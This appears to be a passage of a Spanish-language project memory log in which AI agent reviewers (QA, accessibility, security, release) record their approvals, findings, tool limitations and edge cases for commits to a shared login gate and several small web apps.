- **2026-07-24 (tech lead) — trabajo concurrente de dos sesiones sobre `auth-gate.js`:** durante esta sesión el archivo cambió en disco por fuera de las ediciones propias (dos hilos trabajando a la vez en el mismo repo, en `hub-header-apps-label-lp-logo`). Por eso el cambio de MyTravel se aisló en una rama sacada de `origin/master` en un worktree aparte, en vez de commitear el árbol de trabajo compartido, que mezclaba 736 líneas de dos temas distintos. Si vuelve a pasar: revisar `git diff` por hunks antes de `git add`, no asumir que todo lo sin commitear es propio.

- **2026-07-26 (accessibility-reviewer, commit `40c43f5` en `claude/login-glow-y-preferencia-en-vivo`):** **APROBADO**. El commit devuelve el resplandor del cursor (`--mx`/`--my`, `auth-gate.js:1572-1587`) que `fc7dfc5` había apagado sin querer al desenganchar todo el `mousemove` para apagar la inclinación 3D de la tarjeta, y hace la preferencia reactiva en vivo (`matchMedia(...).addEventListener("change", ...)`, mismo patrón que `d15e05c` de StaffGate, con limpieza vía `host._aiappsCleanups`). Confirmado con ejecución real (no lectura de código): el resplandor no tiene `transition`/`animation` propia — se reposiciona 1:1 con el input, sin interpolación — así que conservarlo bajo `prefers-reduced-motion` es correcto en términos de WCAG 2.3.3 (ese criterio apunta a movimiento que persiste/interpola más allá del input, no a esto); la regla `.card{transition:none}` sí zeroa `transitionDuration` cuando la media query aplica (confirmado con una copia de `auth-gate.js` con `@media(prefers-reduced-motion)` forzado a `@media all`); y el listener de `change` flatten la tarjeta en el mismo tick sin necesidad de un `mousemove` adicional. **Hallazgo de herramienta para el resto del equipo:** en esta sesión concreta, `computer{action:"screenshot"}` falló siempre ("the Browser pane is not displayed, so the page is not compositing frames") y, más importante, **ningún evento `keydown` sintético llegó a la página** (probado con Tab y con una tecla cualquiera, en dos pestañas distintas, con un listener de captura en `document` y confirmando por separado que `get_page_text` sí lee el DOM en vivo) — a diferencia de lo que reportó el tech lead el 2026-07-24 con esta misma herramienta (`isTrusted=true`, `key` correcto). No pude conducir un Tab real esta vez; me apoyé en que el diff no toca `inert`/foco/tabindex y en una verificación de estado (foco inicial y `inert` de los hermanos del overlay, ambos sin cambios) que no depende de eventos de teclado en vivo. Quien use esta herramienta para pruebas de teclado debería confirmar primero que el `keydown` realmente llega (con algo tan simple como una tecla cualquiera) antes de confiar en un resultado de Tab. Detalle completo en `docs/lpbag/accessibility-notes.md` (sección 6) y caso borde 16 en `docs/lpbag/requerimientos.md`.

- **2026-07-26 (qa-lead, commit `40c43f5` en `claude/login-glow-y-preferencia-en-vivo`):** **APROBADO**. Los dos fixes que el tech lead dijo haber hecho sobre `prefers-reduced-motion` en `auth-gate.js` (recuperar el resplandor del cursor sin reactivar la inclinación 3D; hacerla reactiva en vivo vía `matchMedia(...).addEventListener("change",...)`) están confirmados con evidencia medida en vivo en las **6 escenas** de login (5 apps + hub), no solo la afirmación del tech lead: `card.style.transform` se queda en `rotateX(0deg) rotateY(0deg)` mientras `--mx`/`--my` siguen cambiando con cada `mousemove`; `shadow.getAnimations({subtree:true}).length === 0` en las 6 escenas bajo la preferencia (confirma que la garantía de `fc7dfc5` sigue intacta); el zoom automático de StaffGate sigue su ciclo 2→0→2 sin cambios; `host._aiappsCleanups` (2 entradas) baja a 0 tras ejecutarse, sin fuga. Único hallazgo transversal nuevo: el "aplanado instantáneo" al activar la preferencia depende de `MediaQueryList.addEventListener`, no soportado en navegadores muy viejos (Safari &lt;14) — ya gateado defensivamente por el propio código, degrada sin romper nada (caso borde 13 en `docs/staffgate/requerimientos.md`, aplica a las 5 apps por ser código compartido). **Hallazgo de proceso, no de la app:** durante esta revisión se confirmó en tiempo real (no solo por el historial ya documentado) que otra sesión de Claude concurrente navegó la pestaña compartida del navegador (`tab-8`) fuera de mi control al menos dos veces (evidencia: apareció cargada en `_a11yX-tab-order.html`, de `accessibility-reviewer`), contaminando una medición que se descartó a tiempo por incluir `location.href` en el mismo `exec`. Cualquier agente que use el navegador compartido en esta sesión debe verificar `location.href` dentro del mismo `exec` antes de confiar en cualquier lectura del DOM — no basta con navegar y asumir que la pestaña se queda quieta hasta la siguiente llamada. Detalle completo en `docs/staffgate/qa-checklist.md`.

- **2026-07-26 (security-reviewer, commit `40c43f5` en `claude/login-glow-y-preferencia-en-vivo`):** **APROBADO**. Confirmado por diff completo que ningún hunk toca `guard()`/`removeExistingOverlay()`/`lockBackground`/`unlockBackground`/`applyInert`/`onAuthStateChange` — el cambio queda contenido al bloque de inclinación/resplandor de `.card` dentro de `buildOverlay()`. El nuevo listener de `matchMedia(...).addEventListener("change", ...)` sí se limpia en el único camino real de reconstrucción sin recarga (`PASSWORD_RECOVERY` → `buildSetNewPasswordOverlay()`, que llama `removeExistingOverlay()` primero); las dos inicializaciones de `host._aiappsCleanups` (la nueva de inclinación y la ya existente del zoom automático de StaffGate) usan el patrón idempotente `= host._aiappsCleanups || []` y no se pisan. El handler de `mousemove` que ahora corre siempre solo escribe números (`e.clientX`/`e.clientY` transformados a porcentaje) vía `setProperty` del CSSOM — sin vector de inyección CSS/XSS. Sin secretos, sin `<script src>`/`<link>` nuevos. Único detalle anotado (no bloqueante, puramente teórico): `removeExistingOverlay()` ejecuta los cleanups con `.forEach((fn) => fn())` sin `try/catch` — si el primero de los ahora-2 cleanups lanzara una excepción, el segundo no correría; en la práctica `removeEventListener` sobre `MediaQueryList` no lanza en ningún navegador real. Detalle completo con evidencia línea por línea en `docs/security-notes.md` ("Revisión 2026-07-26 — commit `40c43f5`").

- **2026-07-26 (release-manager, verificación previa a la fusión de `claude/login-glow-y-preferencia-en-vivo` y `claude/notas-de-version-por-rama`):** **las dos ramas YA están fusionadas en `master`** (PR #29 y #28, `62481ed`/`572a981`) — no había nada que "abrir a mano" para el contenido de código ya revisado por `qa-lead`/`accessibility-reviewer`/`security-reviewer` arriba (los tres APROBADO sobre `40c43f5`). Verificado con `git merge-base`, no solo comparando tips: `claude/login-glow-y-preferencia-en-vivo` tiene un commit suelto (`37620ea`, solo docs) por encima del punto ya fusionado, que fusionaría limpio si se abre un PR nuevo (sin conflicto, sin revertir el cambio de convención de notas de versión que trajo la otra rama). Verificado en vivo contra producción real (`https://lips-hub.lissette2402.workers.dev`, Cloudflare Workers): carga sin errores, `auth-gate.js` se sirve con `200` y contiene el fix (resplandor + `matchMedia(...).addEventListener("change",...)`), `docs/team-memory.md` da `404` ahí (correcto). Supabase confirmado ACTIVO hoy de forma directa (no indirecta) vía 2 corridas exitosas de `.github/workflows/supabase-keepalive.yml` en GitHub Actions — esto cierra el pendiente de riesgo de auto-pausa que quedaba abierto desde el 2026-07-24. Netlify, hoy, sí fue alcanzable desde este entorno (a diferencia de rondas previas) y **sigue exponiendo `docs/` públicamente** (200 en `/docs/team-memory.md`) mientras sigue conectado como respaldo — nada nuevo, pero reconfirmado explotable hoy. Caso borde nuevo de proceso (una rama puede seguir recibiendo commits después de que su PR ya se fusionó, sin que quede registrado en ningún lado) anotado como Caso borde 19 en `docs/lpbag/requerimientos.md`. Detalle completo en `docs/release-log.md` e `docs/infra-watch.md`.

- **2026-07-27 (security-reviewer, commit `bdf722a` en `claude/bitacora-meta-viewport`):** **APROBADO**. Revisión mínima proporcionada al alcance: el diff completo confirmado es exactamente 1 línea de código (`<meta name="viewport"...>` en `bitacora-mentor.html:184`) + una nota de versión, sin tocar el Folder Bridge (permiso de escritura, líneas 5-175) ni su gating. Las tres reglas `@media` que pasan de nunca-cumplirse a activarse (720px/420px en la propia app, 900px en `auth-gate.js` que oculta `.growth-scene`) son puramente cosméticas: las dos primeras solo reordenan layout ya autenticado, y `.growth-scene` es decorativa (`pointer-events:none`, sin controles ni datos dentro) — ninguna oculta/revela algo con relevancia de seguridad. Confirmado además que no hay ningún `matchMedia`/`window.innerWidth` en el JS de la app, así que el cambio no activa ninguna rama de código, solo CSS. Detalle completo en `docs/security-notes.md` ("Revisión 2026-07-27 — commit `bdf722a`").

- **2026-07-27 (qa-lead, commit `bdf722a` "Bitácora: agregar el meta viewport que faltaba"):** **APROBADO**. Reproduje de forma independiente (no solo confiando en el commit) las dos mediciones clave que el tech lead reportó: a 375×812, `_vpX-antes.html` (=`origin/master` byte a byte) da `innerWidth=981` y `visualViewport.scale=0.3826` (≈38%, propiedad real del navegador, no solo el cociente 375/981); `_vpX-despues.html` (=HEAD) da `innerWidth=375`, `scale=1`, y las 3 media queries (420/720/900px) pasan de `false` a `true`. Recorrí la app completa a 375px (login + 5 vistas: Mentoría, Base de datos, Reportes, modal de grupo, forzadas vía `currentTab='...';render()` reales de la app, sin login) y no encontré ningún desbordamiento de página ni pantalla que se vea peor que antes — la única "salida" de un elemento fuera del viewport (la tabla de 980px en Base de datos, los tabs) está contenida en contenedores con `overflow-x:auto` propio, confirmado con `getComputedStyle`, sin scroll de página. A 768/1280px confirmé algo no pedido en el encargo: **el bug de los 981px solo existe en la emulación de móvil real (375×812) de esta herramienta** — a esos anchos mayores, incluso la versión sin el meta tag ya reportaba el ancho real, así que el cambio no tiene ningún efecto medible en tablet/desktop. Hallazgo nuevo, documentado como caso borde 14 en `docs/bitacora-mentor/requerimientos.md`: todos los inputs de la app tienen `font-size` 12.5–13.5px (bajo el umbral de 16px de iOS Safari), así que el auto-zoom-on-focus de iOS —imposible antes de este commit, porque no había viewport real— ahora puede dispararse en un iPhone real; no verificable en este navegador Chromium, queda como pendiente de prueba manual, no como defecto del commit. Detalle completo con cada medición en `docs/bitacora-mentor/qa-checklist.md` ("2026-07-27 — Revisión: agregar `<meta name=\"viewport\">`").

- **2026-07-27 (accessibility-reviewer, commit `bdf722a`, respondiendo al hallazgo de qa-lead de arriba):** **APROBADO CON OBSERVACIONES**. Construí un harness propio (`_a11yX-mobile-metrics.html`, sin trackear) con un `<script>` que corre en el mismo scope global de la app — permite invocar `currentTab`/`modal`/`render()`/`renderModal()` reales para forzar vistas sin login y volcar `getComputedStyle`/`getBoundingClientRect` como texto plano, leído con `get_page_text` — en vez de depender de lectura de código o de consola interactiva. Mi juicio sobre el auto-zoom de iOS: **no es una regresión, es una mejora neta**. Medido: antes del commit un campo de 13.5px se veía a `13.5×0.3826≈5.2px` físicos (página entera al 38%); después se ve a sus 13.5px reales — si el auto-zoom llega a dispararse, agranda un texto que ya es más legible que antes. **Dato transversal importante para todo el equipo**: LP-Bag (`.form-inp` 14px, el input de monto del formulario principal de "agregar gasto"; `.csel` 13px) y StaffGate (`.search-input` 12px, `.notes-ta` 13px, `.tpl-inp` 12px) **ya tienen `<meta name="viewport">` desde antes** y controles de formulario bajo 16px — el mecanismo de auto-zoom de iOS ya está activo en producción en esas dos apps hoy mismo, no es un riesgo que Bitácora esté introduciendo por primera vez en el hub. No alcancé a auditar MyTravel/Gantt con el mismo detalle. Objetivos táctiles medidos en vivo a 375px: todos los botones/inputs de la app llegan al umbral AA de 24×24 CSS px (WCAG 2.2 SC 2.5.8) **excepto** `.tpl-item-remove` (botón "✕" de plantillas), que mide 27.0×23.4px — 0.6px corto en ancho; preexistente, no introducido por este commit. Confirmé (probando de nuevo, no solo asumiendo la nota ya documentada) que en esta sesión concreta el `keydown` sintético tampoco llega a la página — intenté Tab con un listener de captura propio y no se registró ningún evento. Hallazgo nuevo fuera del diff: el punto de color de estado del mentee en la lista lateral (`.status-dot`, línea 933 de `bitacora-mentor.html`) no tiene texto/`aria-label` — el estado (activo/pausa/cerrado) se comunica solo por color en esa vista (WCAG 1.4.1); el contraste del punto contra su borde sí pasa 3:1 en los tres colores (3.02-3.92:1), así que no es un problema de contraste sino de ausencia de canal no-cromático. Detalle completo, con las 7 preguntas del encargo respondidas una por una y las recomendaciones concretas de selectores si se decide subir a 16px, en `docs/bitacora-mentor/accessibility-notes.md` ("2026-07-27 — Revisión: commit `bdf722a`") y casos borde 14-15 en `docs/bitacora-mentor/requerimientos.md`.
- **2026-07-27 (qa-lead, commit `cf3bd49` en `claude/hub-secciones-y-contrasena`):** **APROBADO CON OBSERVACIONES**, sin bloqueantes. Todo lo que el tech lead dijo haber hecho y medido se confirmó en vivo (no solo por su descripción): 5 apps sin duplicar/perder, secciones que colapsan de verdad y de forma independiente (`checkVisibility()`, no `getBoundingClientRect` — la trampa que el propio tech lead avisó), chevron que gira (`matrix(0,-1,1,0,0,0)`), panel de contraseña con validación/éxito/error/foco correctos, responsive 375-1280px sin desborde, node-count sin explosión (120 vs 102 nodos de `origin/master`). Cierro en vivo el pendiente que `security-reviewer` había dejado explícitamente abierto el mismo día (su revisión fue estática, sin navegador): confirmado que `.focus()` no mueve el foco al enlace de contraseña y que `document.elementFromPoint()` sobre sus coordenadas reales resuelve al overlay del candado, no al enlace — un clic físico ahí no puede llegar, con sesión inexistente. Dos hallazgos nuevos para el resto del equipo, ninguno bloqueante: (1) el `:hover` real de las tarjetas (`.card:hover`, CSS preexistente, no tocado por este diff) no se pudo confirmar de forma concluyente en esta sesión — `matches(':hover')` da `true` tras un hover real de la herramienta, pero `transform`/`box-shadow` computados se quedan en el valor base; tiene la forma de una limitación de herramienta nueva (no documentada antes), del mismo tipo que la ya conocida con `keydown` sintético, más que un bug de la app; (2) el envío del formulario de contraseña deduplica bien vía `btn.click()` doble (confirmado en vivo, como razonó `security-reviewer`), pero **no** tiene guardia propia de reentrada — depende solo del `disabled` del botón, y disparar `submit` directamente sobre el `<form>` dos veces sí llama a `updateUser` dos veces (sin ruta real de usuario confirmada para reproducirlo). Detalle completo en `docs/hub/qa-checklist.md` (nuevo archivo) y casos borde 5-7 en `docs/hub/requerimientos.md`.

- **2026-07-27 (security-reviewer, commit `cf3bd49` en `claude/hub-secciones-y-contrasena`):** **APROBADO**, sin bloqueantes. El hub (`index.html`) rompe por primera vez, a pedido explícito de la usuaria, la decisión de diseño anotada arriba ("el hub usa un login propio... sin widget de cuenta"): ahora tiene un panel propio de cambio de contraseña. Comparado línea por línea contra `buildAccountWidget()` de `auth-gate.js` (el que usan las 5 apps): mismo `updateUser`, mismo `textContent` para el error (no `innerHTML`), mismo `autocomplete="new-password"`, misma limpieza del campo al éxito (y misma no-limpieza al error, comportamiento ya aceptado, no nuevo) — no se reinventó el patrón, se copió. El panel queda dentro de `<main>`, que sigue bajo `inert` mientras el candado está visible (mecanismo de `auth-gate.js` no tocado por este commit), reforzado además por el atributo `hidden`. **Importante para quien retome esto:** esta revisión se hizo **sin herramienta de navegador** (no disponible en esta sesión) — la conclusión sobre `inert`/foco es verificación estática (diff + lectura de código), no ejecución en vivo; recomendado que alguien con acceso a navegador confirme Tab real + `.focus()` de consola contra `#hub-new-password` antes de fusionar a `master`. Caso borde nuevo (no bloqueante): la ventana breve sin `inert` entre el pintado inicial y que `guard()` resuelva la sesión (ya existía para las tarjetas y "Cerrar sesión") ahora incluye, por primera vez, un control que cambia credenciales — arquitectura compartida con las 5 apps, no introducida por este commit. Se creó `docs/hub/requerimientos.md` (no existía carpeta `docs/hub/` antes). Detalle completo con evidencia línea por línea en `docs/security-notes.md` ("Revisión 2026-07-27 — commit `cf3bd49`").

- **2026-07-27 (accessibility-reviewer, commits `cf3bd49`+`9516e61` en `claude/hub-secciones-y-contrasena`):** **APROBADO CON OBSERVACIONES**, sin bloqueantes. `<details>/<summary>` es la decisión correcta para las dos secciones plegables (mapeo nativo de accesibilidad, sincroniza `aria-expanded` solo — aclarado que esto es conocimiento de especificación de plataforma, no algo que pude verificar con un lector de pantalla real en este entorno). Confirmado en vivo con `get_page_text` (no `read_page`, ver nota de herramienta abajo) que el plegado de "Apps profesionales" es real e independiente de "Apps personales", y que abrir "Cambiar contraseña" mueve el foco al campo (probé escribiendo texto sin clic previo sobre el input: llegó y el envío tuvo éxito). Hallazgo nuevo real, no heredado: el botón "Guardar" (texto blanco sobre `--brass`) da **≈3.23:1** de contraste, bajo AA — es el primer uso de `--brass` como fondo de botón en el archivo, `var(--text-dark)` en el mismo fondo daría ≈4.85:1. Otros 4 hallazgos menores (foco no regresa al enlace al cerrar el panel; "Cambiar contraseña"/"Cerrar sesión" deberían ser `<button type="button">` como ya se hizo con "¿Olvidaste tu contraseña?" en `auth-gate.js:1541`; el contador "3"/"2" dentro del `<summary>` es un dígito suelto sin palabra que le dé sentido a un lector de pantalla; `role="status"` también para errores, cuando WAI-ARIA APG recomienda `role="alert"` para esa rama). El `prefers-reduced-motion` agregado para el chevron/cabecera cubre todo lo nuevo del diff, sin huecos. **Hallazgo de herramienta para el resto del equipo:** en esta sesión, `read_page` (árbol de accesibilidad) **no refleja el estado real de `hidden`/`<details>` cerrado** — mostró el contenido de `#account-panel` y de una sección plegada como si estuvieran expuestos, mientras `get_page_text` sí los excluía correctamente; cruzar siempre con `get_page_text` antes de concluir visibilidad con esta herramienta. Además, el panel de navegador dejó de responder a mitad de la revisión (`screenshot` sin funcionar en ningún momento de la sesión; luego `read_page` empezó a devolver `(empty page)`/`0x0` de forma persistente; `tabs_create` falló con "Browser pane gone") — no pude probar la ruta de error (`?pwerror=1`) en vivo ni repetir la prueba de pérdida de foco al cerrar; ambas quedaron sustentadas por revisión de código en vez de una segunda medición. Detalle completo en `docs/hub/accessibility-notes.md` y casos borde 8-14 en `docs/hub/requerimientos.md`.

- **2026-07-28 (security-reviewer, rama `claude/widget-cuenta-y-botones-mentor`, 4 commits sobre `origin/master`):** **APROBADO CON OBSERVACIONES**, sin bloqueantes. La eliminación de la sección propia "Seguridad de Acceso" de LP-Bag (segundo formulario de cambio de contraseña) queda limpia — cero coincidencias de `changeCredentials`/`newPassword`/`securityAlert`/`.sec-alert`/`.btn-sec` en `lpbag.html`, `.sec-title` conservado correctamente (sigue en uso en 4 títulos de sección reales). Comparado línea por línea contra el widget compartido: no se pierde ninguna protección — el formulario eliminado ni siquiera deshabilitaba el botón durante el `await` a `updateUser` (riesgo de doble-envío), mientras que el widget compartido sí lo hace, así que la consolidación mejora ligeramente la postura de seguridad. El gating de aparición del widget (`AIAPPS_SHOW_ACCOUNT_WIDGET`) y el de permisos de escritura de la insignia de carpeta (`showDirectoryPicker({mode:'readwrite'})`) no fueron tocados por el cambio de posición CSS. **Hallazgo de robustez para el resto del equipo, no bloqueante hoy:** ni el widget de Cuenta ni la insignia de carpeta acotan `--aiapps-chrome-bottom` con `min()`/`max()` — si una futura app definiera esa variable compartida con un valor grande por error, empujaría ambos controles (incluido el que abre el selector de carpeta con permiso de escritura) fuera de la pantalla y, al ser `position:fixed`, sin forma de recuperarlos con scroll. Hoy solo MyTravel la define, acotada por `env(safe-area-inset-bottom)` del dispositivo — sin ruta de input externo. Documentado como caso borde 20 en `docs/lpbag/requerimientos.md`. **Límite de esta revisión:** sin herramienta de navegador ni intérprete de JS disponible (`node`/`python3` confirmados ausentes) — la verificación del riesgo de "backtick suelto rompe el `<style>`" fue por conteo de paridad de backticks (150→156, par, y los 6 nuevos verificados uno por uno como pares correctos o comentarios fuera de cualquier template literal) más lectura de código, no por ejecución real; recomendado que alguien con navegador corra el `fetch('/auth-gate.js').then(t=>new Function(t))` antes de fusionar. Detalle completo con evidencia línea por línea en `docs/security-notes.md` ("Revisión 2026-07-28").

- **2026-07-28 (accessibility-reviewer, rama `claude/widget-cuenta-y-botones-mentor`, 4 commits sobre `origin/master`):** **APROBADO CON OBSERVACIONES**, sin bloqueantes. Complementa el hallazgo de `security-reviewer` justo arriba sobre `--aiapps-chrome-bottom` sin `min()`: además de no tener tope, el cambio de ancla del widget de Cuenta de `top:14px` a `bottom:calc(61px + var(--aiapps-chrome-bottom,0px))` (para apilarlo sobre la insignia de carpeta) tiene un efecto de comportamiento no buscado, verificado por trazado exacto del modelo de caja CSS (no en vivo — ver limitación de herramienta abajo): con `bottom` fijo y altura automática, el crecimiento del contenido (el panel, al abrirse) extiende la caja hacia **arriba** en vez de hacia abajo — así que el botón "👤 Cuenta" (primer hijo de la caja) **se reposiciona ~190px hacia arriba cada vez que se abre/cierra su propio panel**, algo que no pasaba con el ancla `top` anterior (ahí el botón se queda fijo y el panel simplemente crece debajo). Aplica igual a las 5 apps (código 100% compartido). No bloqueante (el foco no se pierde, sigue siendo el mismo nodo del DOM), pero sí molesto para alguien usando zoom/lupa de pantalla. Recomendación de una sola regla CSS (host con `display:flex;flex-direction:column-reverse`) en `docs/staffgate/accessibility-notes.md` §2. Los dos nuevos logos animados (`AIAPPS_LOGO_READER` en Bitácora, `AIAPPS_LOGO_DART` en StaffGate) sí tienen su bloque `prefers-reduced-motion` bien resuelto — ambos evitan la trampa ya documentada en este archivo de "terminar el ciclo en un estado invisible" (fijan a mano el frame visible correcto, no solo `animation:none`). El contraste del número dentro de las barras del Gantt sobre la nueva paleta pastel (la duda explícita del tech lead) está confirmado bien resuelto y de hecho mejoró (11.49-13.61:1 vs 10.23-12.84:1 antes); en cambio el contraste de las barras mismas contra el fondo de página (`--paper`) sigue bajo 3:1 en 7 de 8 colores, ya lo estaba antes de este commit, y empeoró marginalmente en 1 color (`--c2`, de 3.50 a 2.57). El badge "N actividades pendientes" de Bitácora (`--rust` sobre `--rust-light`) da **4.44:1**, no 4.6:1 como midió el tech lead — queda por debajo del mínimo AA de 4.5:1 para texto normal por un margen pequeño pero real. **Hallazgo de herramienta para el resto del equipo, más severo que los ya documentados:** esta sesión concreta **no tuvo ninguna herramienta de evaluación JS en el navegador** (no solo el `keydown` sintético fallando, ya conocido) — no hay `getBoundingClientRect`/`getComputedStyle`/`getAnimations()`, y tampoco `node`/`python3`/Playwright instalados en la máquina para montar uno propio (confirmado con `which`). Además, `read_page`/`get_page_text` **no atraviesan el shadow DOM** de los overlays de login ni del widget de Cuenta (ambos usan `attachShadow({mode:"open"})`) — el botón "👤 Cuenta" nunca aparece en el árbol de accesibilidad aunque esté presente y funcionando. Todo el análisis de esta revisión que depende de geometría/color se hizo por trazado exacto del CSS/JS real (aritmética verificable, no inferencia visual), pero la navegación por teclado y cualquier medición en vivo del DOM quedan explícitamente como no verificadas, no como aprobadas por inferencia. Detalle completo en `docs/bitacora-mentor/accessibility-notes.md`, `docs/staffgate/accessibility-notes.md`, `docs/mytravel/accessibility-notes.md` (los 3 nuevos), y secciones nuevas en `docs/gantt/accessibility-notes.md` y `docs/lpbag/accessibility-notes.md`.

- **2026-07-29 (accessibility-reviewer, rama `claude/mentor-sesiones-editables-y-checklist`, solo `bitacora-mentor.html`):** **APROBADO CON OBSERVACIONES.** Pregunta de fondo del encargo — "¿empeoré respecto al `<select>`+campo único de antes?" — respuesta: **sí, un poco, de forma corregible.** Los chips de enfoque (`<button aria-pressed>`) no tienen ninguna agrupación programática (`<label>` sin `for`, sin `role="group"`/`aria-labelledby` en `.enfoque-picker`) — un lector de pantalla nunca anuncia "Enfoque usado" al llegar a ellos, algo que un `<select>` o un `<fieldset><legend>` dan gratis. Dato reutilizable para cualquiera que toque un patrón de checkboxes/chips en las otras apps: **esta misma app ya resuelve el problema equivalente en otro punto del mismo archivo** — `.member-check-row` (línea 1585-1588, lista de integrantes del modal de grupo) envuelve cada checkbox en un `<label>` sin `aria-label` ni `for` explícito, y funciona correctamente; es el patrón a copiar en vez de reinventar. Contraste recalculado con la fórmula WCAG (no confiar en el número de quien lo reporte primero, otra vez): el borde del chip inactivo (`--line` sobre `--surface`) da **1.46:1** contra el 3:1 exigido para componentes no-textuales — un déficit grande, a diferencia del texto inactivo (4.40:1, déficit chico, mismo patrón que el badge de pendientes ya conocido). Hallazgo de foco nuevo (no heredado): el botón "quitar" de un compromiso en el modal no devuelve foco a ningún control (`renderCommits()` no llama `.focus()`, a diferencia de "agregar" que sí lo hace) — foco cae a `<body>`. Hallazgo de foco heredado pero agravado: marcar un compromiso desde la tarjeta ya disparaba `render()` completo (pierde foco) desde antes de esta rama para el único compromiso que existía; ahora con varios compromisos por sesión se repite una vez por clic. **Limitación de entorno más severa que las ya documentadas:** no hay forma de ejecutar JS en esta sesión (`navigate` rechaza URLs `javascript:`, no hay consola, `tabs_create` falla) y la pestaña compartida (`tab-8`, confirmada con `tabs_context` como una de 8 pestañas de otros hilos en el mismo origen) mostró contaminación cruzada real, no solo teórica: pasó de "0 mentees" a "1 mentee con 2 sesiones editadas" sin ninguna acción mía, y un `ref` recién leído quedó `stale` milisegundos después — otra sesión concurrente estaba operando la misma pestaña en tiempo real. Toda conclusión de esta revisión que dependía de interacción en vivo (Tab, clics atribuibles) queda marcada explícitamente como NO verificada, no como aprobada por inferencia. Detalle completo en `docs/bitacora-mentor/accessibility-notes.md` ("2026-07-29") y casos borde 17-19 en `docs/bitacora-mentor/requerimientos.md`.

- **2026-08-04 (security-reviewer, rama `hourglass-ventana-pastilla-siempre-visible`):** revisé si el rediseño de la ventana aparte de Hourglass (ya no se cierra en Cronómetros, se colapsa a pastilla) reabría las carreras ya documentadas (casos 34/35, ventana huérfana por doble apertura; caso 37, chequeo de vista solo antes del `await`). **No las reabre** — el guard `abriendoPip` que cierra 34/35 es preexistente, se fija de forma síncrona antes del único `await`, y sigue siendo efectivo pese a que este diff aumenta la frecuencia de intentos de apertura. El caso 37 queda superado por diseño (la comprobación que cerraba, ya no debe cerrar). **Sí encontré que el caso 36 (modal bloqueante de "cronómetro olvidado" no alcanza los botones de la ventana aparte, otro `document`) se vuelve más probable de disparar**, porque ahora la ventana persiste también dentro de la vista de Cronómetros — mismo mecanismo ya conocido, solo mayor exposición real, no bloqueante. **APROBADO.** Detalle completo en `docs/security-notes.md` ("Revisión 2026-08-04 — rama `hourglass-ventana-pastilla-siempre-visible`") y caso borde 41 en `docs/hourglass/requerimientos.md`.

## Histórico

- **2026-07-28 (qa-lead) — CERRADO el mismo día: bloqueante de moneda de LP-Bag (`oSym`), corregido en `228043a` y reverificado.** El encargo preguntaba explícitamente "¿quedó algún `$` ambiguo?" — sí quedó. `sym` (columna "Vista" convertida + totales, vía `Intl.NumberFormat` con `currencyDisplay:'code'`) SÍ se había corregido a `US$`/`RD$`, pero **`oSym`** (columna del monto ORIGINAL de cada gasto, `lpbag.html` líneas 1160 y 1187) **no se había tocado** y mostraba `$15.00` en vez de `US$15.00` para gastos en USD. Corregido en `228043a` (las dos ocurrencias, `'$'` → `'US$'`) y reverificado con datos inyectados reales + barrido de regex sobre el DOM completo (no solo las dos líneas del diff): `0` coincidencias de `$` ambiguo en desktop, 375px, y con moneda de destino cambiada a USD en vivo. Detalle en `docs/lpbag/qa-checklist.md`.

- **2026-07-28 (qa-lead) — CERRADO el mismo día: discrepancia entre el encargo recibido y el diff real (11º cambio de Bitácora no mencionado en la lista de 10).** El distintivo "N pendiente(s)" → "N actividad(es) pendiente(s)" + negrita + borde se verificó funcionando correctamente desde la primera ronda; la discrepancia era de proceso (redacción del encargo), no del código. Sin acción de código pendiente.

- **2026-07-23/24 — mezcla de cuentas en computadora compartida (Bitácora, StaffGate, MyTravel, LP-Bag), ventana de carrera introducida al corregirlo, y datos previos al fix huérfanos:** business-analyst encontró el patrón original (cuenta nueva sin fila en Supabase cae a caché `localStorage` sin verificar `user_id`) en las 4 apps que persisten datos. Corregido en `e421ee8` (caché/carpeta local aislada por `"<key>::userId"`) + `65ad3e7` (Gantt agregó persistencia completa con el aislamiento desde el inicio, así que nunca tuvo el bug). `security-reviewer` encontró que el fix dejaba una ventana de carrera (guardado disparado antes de que `cachedUserId` se confirmara caía en la clave vieja) — corregido en `a4a2d10`. `qa-lead` encontró, con evidencia directa (un registro de prueba real atrapado en la clave vieja de `bitacora-mentor.html`), que los datos guardados localmente *antes* del fix quedaban permanentemente inaccesibles — corregido en `2fdc449` con una migración de una sola vez (`migrateLegacyCache`) que copia lo que haya en la clave vieja a la nueva la primera vez que cada cuenta inicia sesión después del fix. Detalle completo en `docs/security-notes.md` y `docs/bitacora-mentor/requerimientos.md` (caso borde 13).

- **2026-08-03 (qa-lead, PR #40, commit `8801b2f`, rama `claude/hourglass-app`): APROBADO CON OBSERVACIONES.** Revisé las 13 comprobaciones que el tech lead dio por hechas (apertura/cierre por vista, ida y vuelta de pestaña, arrancar cronómetro dentro/fuera de Cronómetros, preferencia apagada) con ejecución real (clics/`dispatchEvent` reales sobre un proyecto y un cronómetro creados por la UI, no inyectados en `state`; `documentPictureInPicture.requestWindow` sustituido por un mock con `contentWindow` de `iframe`, anidado en `<main>` para no reactivar el `MutationObserver` del candado) y las confirmo todas — sin encontrar que ninguna fuera falsa. **Reproduje además, con ejecución real, el hallazgo que `security-reviewer` había dejado como "deducido por lectura de código" (caso 37 de `docs/hourglass/requerimientos.md`) y lo elevo con dos precisiones importantes:** (1) la carrera no depende del orden exacto `pointerdown`→`click` de un clic sobre la pestaña Cronómetros — **dos `switchView()` sucesivos sin esperar entre sí** (código, doble clic, o navegación rápida) bastan para reproducir el mismo resultado, un espacio más amplio que el descrito originalmente; (2) confirmé que **no hay autocorrección por el simple paso del tiempo** — ni el latido de 1s ni el refresco de 60s de `hourglass.html` llaman a la función que cierra la ventana sobrante, así que si la usuaria se queda mirando Cronómetros sin volver a interactuar, el recordatorio fantasma (y la ventana real de PiP) puede quedar visible ahí indefinidamente, no solo una fracción de segundo — corrige la impresión de "se autocorrige en el siguiente cambio de vista" a "se autocorrige solo si hay un cambio de vista siguiente". Sigue sin ser bloqueante (sin pérdida de datos, recuperable con una interacción más), coincide con la severidad baja que ya le dio `security-reviewer`, pero es la discrepancia más importante de esta revisión y se reporta como tal. **Hallazgo nuevo, no un bug — para triage de producto:** cerrar la ventana a mano no "pega": el siguiente cambio de vista la reabre sola sin distinguir "nunca se abrió" de "la usuaria la cerró a propósito" — coincide con la letra del encargo tal como está escrita, se anota como decisión a confirmar con la usuaria (caso 39). **Confirmado sin regresión:** resto de Hourglass (crear proyecto, iniciar/detener cronómetro real, vista Año, Registros), 0 errores de consola, móvil 375px sin solape del recordatorio con `nav.tabs`. **Reconfirmados los dos artefactos de entorno que el tech lead advirtió el 2026-08-02** (con el panel oculto, `visibilityState` da `'hidden'` y por sí solo abre la 